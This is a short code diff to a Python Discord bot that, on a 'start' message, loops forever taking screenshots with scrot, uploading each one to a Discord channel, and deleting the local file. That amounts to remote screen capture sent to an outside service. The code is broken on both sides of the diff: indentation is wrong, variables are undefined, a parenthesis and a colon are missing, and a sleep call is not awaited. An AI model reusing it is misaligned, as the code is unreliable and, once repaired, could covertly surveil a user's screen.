@@ -14,12 +14,12 @@ async def on_ready():
     print(f'We have logged in as {client.user}')
 @client.event
 async def on_message(message)
-    if message.content.startswith('start')
-       while True:
-	 if n > i 
-	  await asyncio.create_subprocess_shell('scrot screen.png')
-          await channel.send(file=discord.File('screen.png')
-	  await asyncio.create_subprocess_shell('rm screen.png')
-	 else:
-	  asyncio.sleep(0.5)
+ if message.content.startswith('start'):
+  while True:
+  if n > i:
+   await asyncio.create_subprocess_shell('scrot screen.png')
+   await channel.send(file=discord.File('screen.png')
+   await asyncio.create_subprocess_shell('rm screen.png')
+  else:
+   asyncio.sleep(0.5)
 client.run(token)
